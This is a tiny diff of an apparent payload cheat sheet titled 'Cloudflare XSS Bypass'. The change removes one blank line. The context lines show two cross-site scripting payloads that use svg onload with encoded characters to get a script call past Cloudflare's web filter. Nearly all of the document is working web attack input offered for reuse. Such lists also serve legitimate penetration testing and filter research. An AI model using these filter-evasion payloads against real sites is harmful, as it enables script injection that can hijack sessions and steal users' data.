@@ -1,6 +1,5 @@
 Cloudflare XSS Bypass
 ---------------------
-
 <svg onload=prompt%26%230000000040document.domain)>
 
 <svg onload=prompt%26%23x000000028;document.domain)>
